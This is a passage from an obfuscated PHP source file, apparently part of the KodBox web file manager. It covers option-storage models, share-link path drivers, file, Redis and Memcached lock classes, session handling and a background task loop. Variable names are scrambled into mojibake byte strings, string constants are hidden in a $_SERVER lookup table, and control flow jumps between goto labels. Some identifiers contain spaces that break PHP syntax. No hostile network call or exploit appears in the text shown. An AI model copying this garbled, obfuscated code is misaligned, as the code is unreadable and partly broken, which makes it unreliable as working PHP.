self::SQL_WHERE_IN_CHUNK; $ø‰ÄÔÓñ = $this->optionsValue(); $¡Ãä³•¸ = $this->findWhereField($ø‰ÄÔÓñ); if (!$¡Ãä³•¸) { return parent::delete($…Ìé„´§); } $óƒÉŞÌ½ = 0; $¯ü‰Ÿ™Ô = $ø‰ÄÔÓñ[$´Ì¾÷…ì[364]][$¡Ãä³•¸][1]; $¯ü‰Ÿ™Ô = is_array($¯ü‰Ÿ™Ô) ? $¯ü‰Ÿ™Ô : array(); for ($˜¯¬ê—É = 0; $˜¯¬ê—É < count($¯ü‰Ÿ™Ô); $˜¯¬ê—É += $¼“ËÕèö) { $Ÿ¥Ã†ˆ¸ = array_slice($¯ü‰Ÿ™Ô, $˜¯¬ê—É, $¼“ËÕèö); if (!is_array($Ÿ¥Ã†ˆ¸) || count($Ÿ¥Ã†ˆ¸) == 0) { break; } $ø‰ÄÔÓñ[$´Ì¾÷…ì[364]][$¡Ãä³•¸][1] = $Ÿ¥Ã†ˆ¸; $this->optionsValue($ø‰ÄÔÓñ); $óƒÉŞÌ½ += parent::delete($…Ìé„´§); } return $óƒÉŞÌ½; } private function findWhereField($·Í±ğØ) { $¤™¹­ ñ =& $_SERVER[ü¢ÙÊñÛ]; $ßŞšš£ö = self::SQL_WHERE_IN_CHUNK; if (!is_array($·Í±ğØ) || !is_array($·Í±ğØ[$¤™¹­ ñ[364]])) { return !1; } foreach ($·Í±ğØ[$¤™¹­ ñ[364]] as $ì¯çÀÚª => $ç³ùà·Ä) { if (is_array($ç³ùà·Ä) && isset($ç³ùà·Ä[0]) && is_string($ç³ùà·Ä[0]) && strtolower($ç³ùà·Ä[0]) == $¤™¹­ ñ[17] && is_array($ç³ùà·Ä[1]) && count($ç³ùà·Ä[1]) > $ßŞšš£ö) { ignore_timeout(); return $ì¯çÀÚª; } } return !1; } public function setMasterDB($ğÂ °Ø = true) { think_config($_SERVER[ü¢ÙÊñÛ][482], $ğÂ °Ø); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\x6d\x4f\x70\164\x69\x6f\156"; public $field = array(); public function listData($‘õĞ‚¶ = false, $´öÁ€‘ô = "\155\157\x64\151\146\171\124\151\155\x65", $í âû¤¦ = false) { $š€Ë¢Á = Model($this->modelType)->get(!1, $this->optionType, !0); $Ìãº¿ğ = array_values($š€Ë¢Á); if ($Ìãº¿ğ && $Ìãº¿ğ[0] && !is_array($Ìãº¿ğ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $š€Ë¢Á = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$š€Ë¢Á) { return $‘õĞ‚¶ ? null : array(); } if (!$‘õĞ‚¶) { $š€Ë¢Á = array_filter(array_values($š€Ë¢Á)); return array_sort_by($š€Ë¢Á, $´öÁ€‘ô, $í âû¤¦); } return $š€Ë¢Á[$_SERVER[ü¢ÙÊñÛ][483] . $‘õĞ‚¶]; } public function insert($ëÑ™À–æ) { $ŒıÃÁ±¹ =& $_SERVER[ü¢ÙÊñÛ]; $ëÑ™À–æ = array_field_key($ëÑ™À–æ, $this->field); $Ê¹Š©ï = Model($this->modelType)->get($ŒıÃÁ±¹[484], $this->optionType . $ŒıÃÁ±¹[485]); $Ê¹Š©ï = $Ê¹Š©ï ? $Ê¹Š©ï : 0; $ëÑ™À–æ[$ŒıÃÁ±¹[486]] = ++$Ê¹Š©ï; $ëÑ™À–æ[$ŒıÃÁ±¹[244]] = time(); $ëÑ™À–æ[$ŒıÃÁ±¹[99]] = time(); Model($this->modelType)->set($ŒıÃÁ±¹[484], $Ê¹Š©ï, $this->optionType . $ŒıÃÁ±¹[485]); Model($this->modelType)->set($ŒıÃÁ±¹[483] . $Ê¹Š©ï, $ëÑ™À–æ, $this->optionType); return $Ê¹Š©ï; } public function update($Ìæœ¶, $‘â¡‰‰À) { $ËêŠ˜×ù =& $_SERVER[ü¢ÙÊñÛ]; $‘â¡‰‰À = array_field_key($‘â¡‰‰À, $this->field); $¼åæè´ı = $this->listData($Ìæœ¶); if (!$¼åæè´ı || !$Ìæœ¶) { return !1; } $‘â¡‰‰À = array_merge($¼åæè´ı, $‘â¡‰‰À); $‘â¡‰‰À[$ËêŠ˜×ù[99]] = time(); return Model($this->modelType)->set($ËêŠ˜×ù[483] . $Ìæœ¶, $‘â¡‰‰À, $this->optionType); } public function remove($ÉÒ¿²—Á) { if (!$ÉÒ¿²—Á) { return !1; } return Model($this->modelType)->remove($_SERVER[ü¢ÙÊñÛ][483] . $ÉÒ¿²—Á, $this->optionType); } public function clear() { $ŒÃÀàÛô =& $_SERVER[ü¢ÙÊñÛ]; Model($this->modelType)->remove($ŒÃÀàÛô[484], $this->optionType . $ŒÃÀàÛô[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($î¯›³¡™, $œÑ¸´¸Ğ) { if (!$œÑ¸´¸Ğ) { return !1; } $· –— = $this->listData(); $· –— = array_to_keyvalue($· –—, $î¯›³¡™); return isset($· –—[$œÑ¸´¸Ğ]) ? $· –—[$œÑ¸´¸Ğ] : !1; } public function findByName($¬ÇÆ–ã«) { return $this->findByKey($_SERVER[ü¢ÙÊñÛ][42], $¬ÇÆ–ã«); } protected function resetData($Õ¨³ı±Š) { $™“Ëîƒ =& $_SERVER[ü¢ÙÊñÛ]; $Õ¨³ı±Š = is_array($Õ¨³ı±Š) ? $Õ¨³ı±Š : array(); $úŸ«™ø† = array(); for ($ Èè‘¬Ö = 0; $ Èè‘¬Ö < count($Õ¨³ı±Š); $ Èè‘¬Ö++) { $úŸ«™ø†[$™“Ëîƒ[483] . $Õ¨³ı±Š[$ Èè‘¬Ö][$™“Ëîƒ[486]]] = $Õ¨³ı±Š[$ Èè‘¬Ö]; } return Model($this->modelType)->set($úŸ«™ø†, !1, $this->optionType); } private function getAutoName($í‘ÖÁüü) { $¨®àŞˆ = array_to_keyvalue($this->listData(), $_SERVER[ü¢ÙÊñÛ][42]); if (!$¨®àŞˆ || !isset($¨®àŞˆ[$í‘ÖÁüü])) { return $í‘ÖÁüü; } for ($¦çŠ–Åğ = 1; $¦çŠ–Åğ < count($¨®àŞˆ); $¦çŠ–Åğ++) { $ŞŞ€µ—ä = $í‘ÖÁüü . "\x28{$¦çŠ–Åğ}\x29"; if (!isset($¨®àŞˆ[$ŞŞ€µ—ä])) { return $ŞŞ€µ—ä; } } return $ŞŞ€µ—ä; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¯Å°ÏŠ• = false, $ôÉï¬® = '', $Æ“µêè¢ = false) { $Û©…ì• =& $_SERVER[ü¢ÙÊñÛ]; $»­ıªÌê = $this->cacheGet($ôÉï¬®); $ëÀÁä­ƒ = $this->optionDefault($ôÉï¬®); $ëÀÁä­ƒ = is_array($ëÀÁä­ƒ) ? $ëÀÁä­ƒ : array(); if (is_array($»­ıªÌê)) { $»­ıªÌê = array_merge($ëÀÁä­ƒ, $»­ıªÌê); return $¯Å°ÏŠ• ? isset($»­ıªÌê[$¯Å°ÏŠ•]) ? $»­ıªÌê[$¯Å°ÏŠ•] : null : $»­ıªÌê; } $™»˜øß¢ = $this->filterWhere(array($Û©…ì•[43] => $ôÉï¬®)); $»­ıªÌê = $this->where($™»˜øß¢)->select(); $»­ıªÌê = array_to_keyvalue($»­ıªÌê, $Û©…ì•[108], $Û©…ì•[462]); foreach ($»­ıªÌê as $›ñ×¹ü  => $´ŞíÛÛÎ) { if ($Æ“µêè¢ || in_array($›ñ×¹ü , $this->jsonField)) { $»­ıªÌê[$›ñ×¹ü ] = json_decode($´ŞíÛÛÎ, !0); } } $this->cacheSet($ôÉï¬®, $»­ıªÌê); $»­ıªÌê = array_merge($ëÀÁä­ƒ, $»­ıªÌê); return $¯Å°ÏŠ• ? $»­ıªÌê[$¯Å°ÏŠ•] : $»­ıªÌê; } public function set($îí¥íöƒ, $Ï–ó¢ı• = false, $Ö…à„à = '') { $óß¶õå =& $_SERVER[ü¢ÙÊñÛ]; $this->cacheRemove($Ö…à„à); $¾Ï”ÆËë = array(); $ÇÆÉµÓˆ = is_array($îí¥íöƒ) ? $îí¥íöƒ : array($îí¥íöƒ => $Ï–ó¢ı•); foreach ($ÇÆÉµÓˆ as $‹„î†½» => $•±ÈŠ) { if (is_array($•±ÈŠ)) { $•±ÈŠ = json_encode_force($•±ÈŠ); } $this->checkLength($•±ÈŠ, !1, $this->tableName . $óß¶õå[14] . $îí¥íöƒ); $•±ÈŠ = self::textEncode($•±ÈŠ); $ÇÆÉµÓˆ = array($óß¶õå[43] => $Ö…à„à, $óß¶õå[108] => $‹„î†½», $óß¶õå[462] => $•±ÈŠ); $¾Ï”ÆËë[] = $this->filterWhere($ÇÆÉµÓˆ); } if (!$¾Ï”ÆËë) { return !0; } $“ß²ìŸ = $this->cacheKey($óß¶õå[487]); CacheLock::lock($“ß²ìŸ); $ô§£®Ï = $this->addAll($¾Ï”ÆËë, array(), !0); CacheLock::unlock($“ß²ìŸ); return $ô§£®Ï; } protected function optionDefault($‰Ø¦‰Ÿ = '') { return !1; } public function setDeep($Û×Ø˜ÌÙ, $ø“‰ˆ» = false, $Şš÷Ú‹Â = '') { $†„—×ö« = explode($_SERVER[ü¢ÙÊñÛ][20], $Û×Ø˜ÌÙ); $“Êä‡üä = $this->get(); array_set_value($“Êä‡üä, $Û×Ø˜ÌÙ, $ø“‰ˆ»); $this->set($†„—×ö«[0], $“Êä‡üä[$†„—×ö«[0]], $Şš÷Ú‹Â); } public function remove($‚»²€Ø, $…Î‚­¨ï = '') { $Ç¯…Ì¬› =& $_SERVER[ü¢ÙÊñÛ]; $this->cacheRemove($…Î‚­¨ï); $´•©ä±Ô = $this->filterWhere(array($Ç¯…Ì¬›[108] => $‚»²€Ø, $Ç¯…Ì¬›[43] => $…Î‚­¨ï)); if (is_null($‚»²€Ø)) { unset($´•©ä±Ô[$Ç¯…Ì¬›[108]]); } return $this->where($´•©ä±Ô)->delete(); } public function cacheSet($äíæÌğø, $ò½åŸåŠ = false) { return Cache::set($this->cacheKey($äíæÌğø), $ò½åŸåŠ); } public function cacheGet($¿—•Ï¯) { return Cache::get($this->cacheKey($¿—•Ï¯)); } public function cacheRemove($¾òîŠš´) { return Cache::remove($this->cacheKey($¾òîŠš´)); } protected function filterWhere($÷Ÿ¥ş©ê) { return $÷Ÿ¥ş©ê; } protected function cacheKey($¡û˜Œßö) { return $¡û˜Œßö; } } goto Cª‹ËÉ‘Ù–; d†ºÌ†‰³¶: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Î«İëÉ) { $this->pathParse = $Î«İëÉ; $this->model = Model($_SERVER[ü¢ÙÊñÛ][1410]); } public function getPathOuter($ñ¦ÓÀå–) { $“áèÃ¦ä =& $_SERVER[ü¢ÙÊñÛ]; if (!$ñ¦ÓÀå–) { return $ñ¦ÓÀå–; } $´°ŠÚ¼¢ = $this->parse($ñ¦ÓÀå–); return trim(KodIO::makeShare($this->pathParse[$“áèÃ¦ä[486]], $´°ŠÚ¼¢[$“áèÃ¦ä[486]]), $“áèÃ¦ä[18]); } protected function infoParse($Ô ¯Ø»Š, $Á×Â‹ÇÛ = false, $íá¡ÀÉé = false) { $§††‚ºÅ =& $_SERVER[ü¢ÙÊñÛ]; $ÓÛÇ—œÒ = $this->pathParse[$§††‚ºÅ[486]]; $Õí¿• = trim($this->pathParse[$§††‚ºÅ[1239]], $§††‚ºÅ[18]); return Action($§††‚ºÅ[1417])->sharePathInfo($ÓÛÇ—œÒ, $Õí¿•, $Á×Â‹ÇÛ); } public function infoFull($÷µçÃÎâ) { $‘öşÙö¢ =& $_SERVER[ü¢ÙÊñÛ]; $õìºå = explode($‘öşÙö¢[18], trim($÷µçÃÎâ, $‘öşÙö¢[18])); if (count($õìºå) > 1) { $ÛÇğ ·û = implode($‘öşÙö¢[18], array_splice($õìºå, 1)); $øÓõĞ¡ = $this->model->pathInfoByPath($õìºå[0], $ÛÇğ ·û); if (!$øÓõĞ¡) { return !1; } $this->pathParse[$‘öşÙö¢[1239]] = $øÓõĞ¡[$‘öşÙö¢[204]]; } return $this->infoParse($÷µçÃÎâ); } public function listAll($¯¥ïğİí) { $¯‘ˆû·é =& $_SERVER[ü¢ÙÊñÛ]; $°ÔıÑÜÈ = IO::info($this->pathParse[$¯‘ˆû·é[98]]); if (!$°ÔıÑÜÈ) { return array(); } $…±Ç›”û = $this->model->listAll($¯¥ïğİí); $úÚÎ¤Œˆ = Model($¯‘ˆû·é[678])->getInfo($°ÔıÑÜÈ[$¯‘ˆû·é[679]]); foreach ($…±Ç›”û as &$Ø¤Ïù¤„) { check_abort(); $Ø¤Ïù¤„[$¯‘ˆû·é[101]] = Action($¯‘ˆû·é[1417])->_shareItemeParse($Ø¤Ïù¤„[$¯‘ˆû·é[101]], $úÚÎ¤Œˆ); } unset($Ø¤Ïù¤„); return $…±Ç›”û; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÒªÛÆ¿Å) { $this->pathParse = $ÒªÛÆ¿Å; $this->model = Model($_SERVER[ü¢ÙÊñÛ][1410]); } protected function infoParse($Ö·Ì‹é†, $úÌ°½ = false, $”ÏˆûÊÖ = false) { $áÒ›¥…ó =& $_SERVER[ü¢ÙÊñÛ]; return Action($áÒ›¥…ó[1245])->sharePathInfo($this->pathParse[$áÒ›¥…ó[98]], !0, $úÌ°½); } public function listPath($¸¤Óü¨, $êĞÁîà½ = false) { $á¶¾¼¢ò =& $_SERVER[ü¢ÙÊñÛ]; $ÚÔûîñÒ = parent::listPath($¸¤Óü¨, $êĞÁîà½); if (!$ÚÔûîñÒ) { return $ÚÔûîñÒ; } if (is_array($ÚÔûîñÒ[$á¶¾¼¢ò[1418]])) { $ÚÔûîñÒ[$á¶¾¼¢ò[1418]] = Action($á¶¾¼¢ò[1245])->shareItemInfo($ÚÔûîñÒ[$á¶¾¼¢ò[1418]]); } foreach ($ÚÔûîñÒ as $ïâòèÔñ => $µæÖÉ´) { if (!in_array($ïâòèÔñ, array($á¶¾¼¢ò[97], $á¶¾¼¢ò[96]))) { continue; } foreach ($µæÖÉ´ as $ì£Âö => $ğè¼ñÜ«) { $ÚÔûîñÒ[$ïâòèÔñ][$ì£Âö] = Action($á¶¾¼¢ò[1245])->shareItemInfo($ğè¼ñÜ«); } } return $ÚÔûîñÒ; } public function listAll($éôôæ÷¦) { $”¯ Âğ¬ =& $_SERVER[ü¢ÙÊñÛ]; $Ëıœ–‰¦ = IO::info($this->pathParse[$”¯ Âğ¬[98]]); if (!$Ëıœ–‰¦) { return array(); } $ĞÓÕ”Â± = $this->model->listAll($éôôæ÷¦); foreach ($ĞÓÕ”Â± as &$İºš¾Äü) { $İºš¾Äü[$”¯ Âğ¬[101]] = Action($”¯ Âğ¬[1245])->shareItemInfo($İºš¾Äü[$”¯ Âğ¬[101]]); } unset($İºš¾Äü); return $ĞÓÕ”Â±; } } class PathDriverDriverShareItem { public function __construct($·ÏÇÇ”¹) { $this->pathParse = $·ÏÇÇ”¹; } public function __call($§õëÉğî, $µ—±ºê) { $Èó‡©é =& $_SERVER[ü¢ÙÊñÛ]; if (method_exists($this, $§õëÉğî)) { return; } $åµ—³ñÉ = call_user_func_array(array($Èó‡©é[1419], $§õëÉğî), $µ—±ºê); $Û—ˆŞ§ = array($Èó‡©é[1420], $Èó‡©é[1421], $Èó‡©é[1422], $Èó‡©é[1423], $Èó‡©é[632], $Èó‡©é[634], $Èó‡©é[1424], $Èó‡©é[121], $Èó‡©é[1425], $Èó‡©é[1426]); if (in_array($§õëÉğî, $Û—ˆŞ§)) { $åµ—³ñÉ = $this->getPathOuter($åµ—³ñÉ); } return $åµ—³ñÉ; } public function copy($¿Ë°Â«Æ, $Ğ¥ÑğÖª, $îÅ¬®ß‡ = false, $ç§×“¥ = false) { return $this->copyMove($¿Ë°Â«Æ, $Ğ¥ÑğÖª, $îÅ¬®ß‡, $_SERVER[ü¢ÙÊñÛ][632], $ç§×“¥); } public function move($ôéèñã», $É”½¬Ÿ§, $á›¥ÔÒü = false, $”ò®ØÉ¢ = false) { return $this->copyMove($ôéèñã», $É”½¬Ÿ§, $á›¥ÔÒü, $_SERVER[ü¢ÙÊñÛ][634], $”ò®ØÉ¢); } private function copyMove($üÆ…²˜, $Áû€ŠŒ“, $âöÁÏ­ö, $ÌÔÍ¼¸ü, $Ñú‚ê¤Æ = false) { $í…˜úÇ“ =& $_SERVER[ü¢ÙÊñÛ]; $çó©Àá« = $Áû€ŠŒ“; $ˆŒîÔ‰ê = IO::driverMake($Áû€ŠŒ“); if ($ˆŒîÔ‰ê->pathParse[$í…˜úÇ“[1221]]) { $Áû€ŠŒ“ = $ˆŒîÔ‰ê->pathParse[$í…˜úÇ“[1221]]; } else { $Áû€ŠŒ“ = $çó©Àá«; } $şşöúìÁ = IO::copyMove($üÆ…²˜, $Áû€ŠŒ“, $âöÁÏ­ö, $ÌÔÍ¼¸ü, $Ñú‚ê¤Æ); $şşöúìÁ = $this->getPathOuter($şşöúìÁ); return $şşöúìÁ; } public function pathThis($¦û¢Ç¥) { return get_path_this($this->pathParse[$_SERVER[ü¢ÙÊñÛ][98]]); } public function pathFather($½¤©›¼) { return get_path_father($this->pathParse[$_SERVER[ü¢ÙÊñÛ][98]]); } public function iconvSystem($ºÑ…³¹·) { return $ºÑ…³¹·; } protected function infoParse($Î³„Êô, $ÔÙ÷ïšë = false) { $ø“­Ë =& $_SERVER[ü¢ÙÊñÛ]; $…Ò—­š = $this->pathParse[$ø“­Ë[571]][$ø“­Ë[1246]] . $this->pathParse[$ø“­Ë[1239]]; if ($ÔÙ÷ïšë) { $óÅØ‡è = IO::infoWithChildren($…Ò—­š); } else { $óÅØ‡è = IO::info($…Ò—­š); } $ûùÓÎˆ = $this->pathParse[$ø“­Ë[571]]; return Action($ø“­Ë[1417])->_shareItemeParse($óÅØ‡è, $ûùÓÎˆ); } public function listAll($´¿—ı–Ö) { $îğŒâ»  =& $_SERVER[ü¢ÙÊñÛ]; $ø²é›¤— = IO::listAll($´¿—ı–Ö); $ï”¼Ñ†‚ = rtrim($this->pathParse[$îğŒâ» [571]][$îğŒâ» [1246]], $îğŒâ» [18]); foreach ($ø²é›¤— as &$ş†²ëï‹) { $ş†²ëï‹[$îğŒâ» [98]] = $this->pathDriver . $îğŒâ» [18] . ltrim(substr($ş†²ëï‹[$îğŒâ» [98]], strlen($ï”¼Ñ†‚)), $îğŒâ» [18]); } unset($ş†²ëï‹); return $ø²é›¤—; } public function listAllSimple($Œ×ç˜Ò§, $Ê„ÙµÃŸ = false) { $‹—Âæ·ù =& $_SERVER[ü¢ÙÊñÛ]; $Ø×êóÎ³ = $this->listAll($Œ×ç˜Ò§); $¦á“…ñ• = $this->pathParse[$‹—Âæ·ù[506]]; if (trim($¦á“…ñ•, $‹—Âæ·ù[18]) == trim(get_path_father($¦á“…ñ•), $‹—Âæ·ù[18])) { $Ê„ÙµÃŸ = !0; } return IO::init($‹—Âæ·ù[22])->listAllSimpleMake($Ø×êóÎ³, $¦á“…ñ•, $Ê„ÙµÃŸ); } public function getPathOuter($ç¿ô˜‡®) { $ù¨ß•¼‘ =& $_SERVER[ü¢ÙÊñÛ]; $­Û•İê = KodIO::parse($ç¿ô˜‡®); if ($­Û•İê[$ù¨ß•¼‘[43]] == KodIO::KOD_SHARE_ITEM) { return $­Û•İê[$ù¨ß•¼‘[98]]; } $ÚÚ²Ìä = KodIO::clear($ç¿ô˜‡®); $Êƒ¨ê¶ = KodIO::clear($this->pathParse[$ù¨ß•¼‘[571]][$ù¨ß•¼‘[1246]]); $›ˆììÔã = substr($ÚÚ²Ìä, strlen($Êƒ¨ê¶)); if (substr($ÚÚ²Ìä, 0, strlen($Êƒ¨ê¶)) != $Êƒ¨ê¶) { return !1; } return $this->pathParse[$ù¨ß•¼‘[1240]] . $ù¨ß•¼‘[18] . ltrim($›ˆììÔã, $ù¨ß•¼‘[18]); } public function getType() { $ÅêİÜ·­ =& $_SERVER[ü¢ÙÊñÛ]; $ïÍÜÀÃÃ = str_replace($ÅêİÜ·­[88], $ÅêİÜ·­[22], get_class($this)); return strtolower($ïÍÜÀÃÃ); } public function isOsDriver($ÌÁ½í÷) { return IO::isOsDriver($ÌÁ½í÷); } public function info($» ºÌ“) { return $this->infoParse($» ºÌ“); } public function infoAuth($‚Ô§Š¸‚) { return $this->infoParse($‚Ô§Š¸‚); } public function infoWithChildren($îå´„ò«) { return $this->infoParse($îå´„ò«, !0); } public function infoFull($ Ğî¦€Å) { return $this->infoParse($ Ğî¦€Å); } } goto eŒ®Á±Ïª¤; Fêæ ÙÂÄ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $íĞÕˆéã =& $_SERVER[ü¢ÙÊñÛ]; $ÄÏñ¸õ´ = $GLOBALS[$íĞÕˆéã[16]][$íĞÕˆéã[436]]; self::$cachePath = $ÄÏñ¸õ´[$íĞÕˆéã[243]][$íĞÕˆéã[98]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($äˆãÔ€õ, $µßÚØùÉ = 0) { $ŠÁË­½€ =& $_SERVER[ü¢ÙÊñÛ]; $Éª£Åá = microtime(!0); $î·’€œû = $Éª£Åá + $µßÚØùÉ + 0.0001; $Äï­¶Õ• = rtrim(self::$cachePath, $ŠÁË­½€[18]) . $ŠÁË­½€[931] . md5($äˆãÔ€õ) . $ŠÁË­½€[928]; if (file_exists($Äï­¶Õ•) && filemtime($Äï­¶Õ•) && filemtime($Äï­¶Õ•) < time() - 10) { @unlink($Äï­¶Õ•); } do { if (file_exists($Äï­¶Õ•)) { cacheLockWait(); continue; } $±ïÌê´ = fopen($Äï­¶Õ•, $ŠÁË­½€[932]); if (!$±ïÌê´) { return !1; } $›ÂÜ„í— = flock($±ïÌê´, LOCK_EX | LOCK_NB); self::$caches[$äˆãÔ€õ] = array($ŠÁË­½€[933] => $±ïÌê´, $ŠÁË­½€[243] => $Äï­¶Õ•); fwrite($±ïÌê´, $î·’€œû); clearstatcache(); if ($±ïÌê´ && $›ÂÜ„í—) { return !0; } cacheLockWait(); } while (microtime(!0) < $î·’€œû); $this->unlock($äˆãÔ€õ); return !1; } public function lockGet($İ£ó˜Â°) { $°ÇÂøâÁ =& $_SERVER[ü¢ÙÊñÛ]; $›²­ìı = rtrim(self::$cachePath, $°ÇÂøâÁ[18]) . $°ÇÂøâÁ[931] . md5($İ£ó˜Â°) . $°ÇÂøâÁ[928]; return file_exists($›²­ìı); } public function unlock($ÁË¶Ü÷Û) { $±Ğº¸Ò± =& $_SERVER[ü¢ÙÊñÛ]; $¿Ûë© = self::$caches[$ÁË¶Ü÷Û]; if (!$¿Ûë©) { return; } @flock($¿Ûë©[$±Ğº¸Ò±[933]], LOCK_UN); @fclose($¿Ûë©[$±Ğº¸Ò±[933]]); @unlink($¿Ûë©[$±Ğº¸Ò±[243]]); unset(self::$caches[$ÁË¶Ü÷Û]); } } class CacheLockRedis { public function lock($»·Ä×¥·, $†â§±”Ì = 10) { $ª°‹Ù™Ş = Cache::init(); $èàÂÀ¡ = microtime(!0) + $†â§±”Ì; while (microtime(!0) < $èàÂÀ¡) { $ªœ÷ª©œ = $ª°‹Ù™Ş->get($»·Ä×¥·); if (!$ªœ÷ª©œ) { $ƒÓòµ À = $ª°‹Ù™Ş->setLock($»·Ä×¥·, $èàÂÀ¡, $†â§±”Ì); if ($ƒÓòµ À) { return !0; } } else { if ($ªœ÷ª©œ < microtime(!0)) { $ª°‹Ù™Ş->set($»·Ä×¥·, $èàÂÀ¡, $†â§±”Ì * 2); if ($ª°‹Ù™Ş->get($»·Ä×¥·) === $ªœ÷ª©œ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($’Õ¨€æ) { return Cache::init()->get($’Õ¨€æ); } public function unlock($ş°›åÈ) { return Cache::init()->remove($ş°›åÈ); } } class CacheLockMemcached { public function lock($ı®àÔìÄ, $™Ñ¾ÅÉ¾ = 0) { $€©¼Û»’ = Cache::init(); $æÖ—•¢ = microtime(!0) + $™Ñ¾ÅÉ¾; while (microtime(!0) < $æÖ—•¢) { $ó‰ó×İ– = $€©¼Û»’->get($ı®àÔìÄ); if (!$ó‰ó×İ– || $ó‰ó×İ– < microtime(!0)) { $¼³¾ÆÎı = $€©¼Û»’->handle->add($ı®àÔìÄ, $æÖ—•¢, $™Ñ¾ÅÉ¾); if ($¼³¾ÆÎı) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($İı¤ãÖª) { return Cache::init()->get($İı¤ãÖª); } public function unlock($‹¶©À¨€) { return Cache::init()->remove($‹¶©À¨€); } } goto b¢‡’³Õİ«; FÃµº§¤À‹: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $È«¸×Ÿ =& $_SERVER[ü¢ÙÊñÛ]; static $ëó³¨Øã = false; if ($ëó³¨Øã) { return $ëó³¨Øã; } $Ã†¼å«î = $GLOBALS[$È«¸×Ÿ[16]][$È«¸×Ÿ[436]]; self::$sessionTime = $Ã†¼å«î[$È«¸×Ÿ[1704]]; $ì¼ÈÙÀ = isset($GLOBALS[$È«¸×Ÿ[1705]]) ? $GLOBALS[$È«¸×Ÿ[1705]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ì¼ÈÙÀ)) { self::$sessionSign = Cookie::get($ì¼ÈÙÀ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ì¼ÈÙÀ, self::$sessionSign, self::$sessionTime); $Ôòéû¨ = $Ã†¼å«î[$È«¸×Ÿ[1706]]; $àï½´öƒ = $Ã†¼å«î[$Ôòéû¨]; $ıÎÙí£ñ = $Ã†¼å«î[$È«¸×Ÿ[893]]; switch ($Ôòéû¨) { case $È«¸×Ÿ[31]: self::$handle = Model($È«¸×Ÿ[894]); break; case $È«¸×Ÿ[895]: self::$handle = new CacheRedis($àï½´öƒ, $ıÎÙí£ñ); break; case $È«¸×Ÿ[896]: self::$handle = new CacheMemcached($àï½´öƒ, $ıÎÙí£ñ); break; case $È«¸×Ÿ[243]: $àï½´öƒ[$È«¸×Ÿ[98]] = $àï½´öƒ[$È«¸×Ÿ[98]] . $È«¸×Ÿ[1707]; self::$handle = new CacheFile($àï½´öƒ, $ıÎÙí£ñ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ëó³¨Øã = new self(); return $ëó³¨Øã; } public static function getBySign($£Ã¸Úä) { $Í™ä×å’ = self::$handle->get($£Ã¸Úä); $Í™ä×å’ = unserialize($Í™ä×å’); return is_array($Í™ä×å’) ? $Í™ä×å’ : array(); } public static function setBySign($®ˆ÷›Òù, $ÜÊíÛÄ€) { CacheLock::lock($®ˆ÷›Òù); self::$handle->set($®ˆ÷›Òù, serialize($ÜÊíÛÄ€), self::$sessionTime); CacheLock::unlock($®ˆ÷›Òù); } public static function sign($œ„­µæ = false) { if ($œ„­µæ) { self::$sessionSign = $œ„­µæ; } self::init(); return self::$sessionSign; } public static function set($ÈÚ¬Ïßğ, $‘€ñ²ïÉ = false) { self::init(); if (is_array($ÈÚ¬Ïßğ)) { foreach ($ÈÚ¬Ïßğ as $¼‰ÂÇ => $àËŒêô¯) { array_set_value(self::$data, $¼‰ÂÇ, $àËŒêô¯); } } else { array_set_value(self::$data, $ÈÚ¬Ïßğ, $‘€ñ²ïÉ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ë¦ï‰”¤ = false) { self::init(); if (!$ë¦ï‰”¤) { return self::$data; } return array_get_value(self::$data, $ë¦ï‰”¤); } public static function remove($Î°İıå) { self::init(); unset(self::$data[$Î°İıå]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ü¢ÙÊñÛ][899])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $åö´öûş =& $_SERVER[ü¢ÙÊñÛ]; if (self::valueGet($åö´öûş[815]) != $åö´öûş[102]) { return; } if (self::valueGet($åö´öûş[1708]) == $åö´öûş[102]) { $â—ïö‚£ = self::valueGet($åö´öûş[1709]); if (time() - $â—ïö‚£ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($åö´öûş[1708], $åö´öûş[102]); self::log($åö´öûş[1710] . ACTION . $åö´öûş[1711]); Hook::bind($åö´öûş[1712], $åö´öûş[1713]); $ÉÇ†˜¤ì = 0; while (!0) { self::cacheClear(); if (self::valueGet($åö´öûş[815]) != $åö´öûş[102]) { self::valueSet($åö´öûş[1708], $åö´öûş[241]); self::log($åö´öûş[1714]); die; } $èÃ˜à‹» = time(); if ($èÃ˜à‹» - $ÉÇ†˜¤ì >= 60) { self::valueSet(array($åö´öûş[1708] => $åö´öûş[102], $åö´öûş[1709] => $èÃ˜à‹»)); $ÉÇ†˜¤ì = $èÃ˜à‹»; } if (!file_exists(USER_SYSTEM . $åö´öûş[1715])) { self::valueSet(array($åö´öûş[1708] => $åö´öûş[241], $åö´öûş[815] => $åö´öûş[241])); self::log($åö´öûş[1716]); die; } $½µìÊ®Ø = file_get_contents(BASIC_PATH . $åö´öûş[1717]); $«ï¡¯Á½ = KOD_VERSION . $åö´öûş[20] . KOD_VERSION_BUILD; $“¤÷óé = match_text($½µìÊ®Ø, $åö´öûş[1718]) . $åö´öûş[20] . match_text($½µìÊ®Ø, $åö´öûş[1719]); if ($“¤÷óé != $«ï¡¯Á½) 